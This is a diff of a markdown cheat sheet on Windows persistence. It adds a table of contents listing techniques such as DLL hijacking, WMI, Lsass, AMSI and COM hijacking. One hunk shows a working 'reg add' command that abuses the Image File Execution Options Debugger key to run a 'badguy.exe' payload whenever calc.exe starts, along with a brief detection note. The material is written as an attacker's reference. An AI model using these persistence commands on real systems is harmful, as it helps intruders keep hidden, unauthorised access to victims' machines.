@@ -1,3 +1,32 @@
+# Windows persistence addons
+
+</br>
+
+* [Non admin](#Non-admin)
+	* [Malicious dll](#Add-malicious-dll-file-in-reg)
+	* [DLL Search Order Hijacking](#DLL-Search-Order-Hijacking)
+	* [Screensaver](#Screensaver)
+	* [Shortcut Modification](#Shortcut-Modification)
+	* [Waitfor](#Waitfor)
+* [Admin](#Admin)
+	* [Debugger](#Debugger)
+	* [WMI](#Using-WMI-(Windows-Management-Instrumentation))
+	* [AppInit](#AppInit)
+	* [Lsass](#System-process-Lsass)
+	* [Netsh](#Netsh)
+	* [AppCert DLLs](#AppCert-DLLs)
+	* [Authentification Packages](#Authentification-Packages)
+	* [Change default file association](#Change-default-file-association)
+	* [Path Interception](#Path-Interception)
+	* [Port Monitors](#Port-Monitors)
+	* [Time providers](#Time-providers)
+	* [AMSI](#AMSI(Antimalware-Scan-Interface))
+	* [COM Hijacking](#COM-Hijacking)
+
+
+
+</br>
+
 # Non admin
 </br>
 
@@ -144,7 +173,7 @@ write-host "$PSModulePath"
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C C:\Windows\System32\calc.exe & c:\path\to\badguy.exe" /f
 ```
 
-Add command in **HKLM** reg,  that will execute your **badguy.exe** with copy of 
+Add command in **HKLM** reg,  that will execute your **badguy.exe**  
 
 #### Detection:
 User can see malicious string in reg **HKLM**
